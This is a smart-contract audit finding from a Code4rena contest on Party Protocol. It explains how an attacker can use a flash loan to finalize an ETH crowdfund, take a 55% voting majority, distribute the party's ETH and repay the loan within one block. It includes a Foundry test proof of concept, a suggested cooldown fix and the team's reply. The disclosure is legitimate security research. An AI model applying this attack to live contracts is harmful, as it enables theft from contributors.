[H-02] An attacker can contribute to the ETH crowdfund using a flash loan and control the party as he likes
Submitted byhansfriese
https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273
https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L470
An attacker can have more than half of the total voting power using a flash loan and abuse other contributors.
Proof of Concept
The main flaw is that the party can distribute funds right after the crowdfund is finalized within the same block.
So the attacker can contribute using a flash loan and repay by distributing the part’s ETH.
Let’s assumemaxContribution = type(uint96).max, minTotalContributions = 10 ether, maxTotalContributions = 20 ether, fundingSplitBps = 0.An attacker contributes 1 ether(attacker’s fund) to the crowdfund and another user contributes 9 ether.The attacker knows the crowdfund will be finalized as it satisfies theminTotalContributionsalready but he will have 10% of the total voting power.So he decides to contribute 10 ether using a flash loan.InETHCrowdfundBase._processContribution(), the crowdfund will be finalized immediately astotal contribution is greater than maxTotalContributions.Then the attacker will have(1 + 10) / 20 = 55%voting power of the party and he can pass any proposal.So he callsdistribute()with 19 ether.distribute()can be called directly ifopts.distributionsRequireVote == false, otherwise, he should create/execute the distribution proposal and he can do it within the same block.After that, he can receive ETH usingTokenDistributor.claim()and the amount will be19 * 55% = 10.45 ether. (We ignore the distribution fee for simplicity)He repays 10 ether to the flash loan provider and he can control the party as he likes now.
This attack is possible for bothInitialETHCrowdfundandReraiseETHCrowdfund.
Recommended Mitigation Steps
I think we should implement a kind ofcooldown logicafter the crowdfund is finalized.
Add apartyStartedTimeinPartyGovernance.sol.While finalizing the ETH crowdfund inETHCrowdfundBase._finalize(), we setparty.partyStartedTime = block.timestamp.After that,PartyGovernance.distribute()can work only whenblock.timestamp > partyStartTime.
0xean (judge) commented:
Coded POC would have been welcomed here due to the number of steps in the attack, will review further.
hansfriese commented:
Hello @0xean - Here is a POC. It should be appended toInitialETHCrowdfund.t.solfunctiontest_finalizeUsingFlashloan()public{InitialETHCrowdfundcrowdfund=_createCrowdfund({initialContribution:0,initialContributor:payable(address(0)),initialDelegate:address(0),minContributions:0,maxContributions:type(uint96).max,disableContributingForExistingCard:false,minTotalContributions:10ether,maxTotalContributions:20ether,duration:7days,fundingSplitBps:0,fundingSplitRecipient:payable(address(0))});TokenDistributordistributor=newTokenDistributor(globals,0);globals.setAddress(LibGlobals.GLOBAL_TOKEN_DISTRIBUTOR,address(distributor));Partyparty=crowdfund.party();// Attacker has 1 ether nowaddressattacker=_randomAddress();vm.deal(attacker,1ether);// An honest member has 9 etheraddressmember=_randomAddress();vm.deal(member,9ether);// Contributevm.prank(attacker);uint256vp1=crowdfund.contribute{ value:1ether}(attacker,"");vm.prank(member);crowdfund.contribute{ value:9ether}(member,"");// Attacker noticed his voting power will be 10% after finalization, so he decided to contribute 10 ether using flashloanvm.deal(attacker,10ether);// he borrowed 10 ethervm.prank(attacker);uint256vp2=crowdfund.contributeFor{ value:10ether}(1,payable(attacker),attacker,"");//contributed 10 ether again// Crowdfund is finalizedassertTrue(crowdfund.getCrowdfundLifecycle() ==ETHCrowdfundBase.CrowdfundLifecycle.Finalized);assertEq(party.getGovernanceValues().totalVotingPower,20ether);assertEq(vp1+vp2,11ether);//his voting power is 11/20 = 55% nowassertEq(address(party).balance,20ether);assertEq(address(attacker).balance,0);//attacker's eth balance = 0// attacker starts eth distribution of 19 ether from party's balancevm.prank(attacker);ITokenDistributor.DistributionInfomemorydistInfo=party.distribute(19ether,ITokenDistributor.TokenType.Native,address(0),0);assertEq(address(distributor).balance,19ether);//distributor's balanceassertEq(address(party).balance,1ether);//party's remaining balancevm.prank(attacker);distributor.claim(distInfo,1);//attacker claims 55% of 19 etherassertEq(address(attacker).balance,10.45ether);//finally, attacker's balance = 10.45 ether and he can repay the flashloanassertEq(party.getGovernanceValues().totalVotingPower,20ether);assertEq(vp1+vp2,11ether);//his voting power is still 55%}
0xble (Party) confirmed and commented:
Great finding, still debating the mitigation internally.
0xble (Party) acknowledged and commented:
Looking into this more, the issue can only occur if a party sets anexecutionDelayof 0. In the POC, the party was created with default values (null) which is why this could happen in testing. However if changed to a nonzero value, it would require waiting delay duration before the proposal could be executed which would prevent the repayment of the flash loan in a single execution. Since parties are expected to have a nonzero execution delay, we are less concerned about the flash loan aspect of this attack.This finding did prompt us to consider the risk of majority attacks more broadly, where an individual can contribute and become a majority voter in a party (flash loan or not) and take control of the party. We acknowledged the majority attack before audit and don’t consider it a vulnerability. Our reasoning is (1) our governance model prioritizes simplicity and speed of coordination which would be sacrificed by introducing more complex mechanisms to robustly protect against majority attacks and (2) the expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don’t (e.g. set an execution delay of 0) it is a deliberate choice on their part rather than a vulnerability.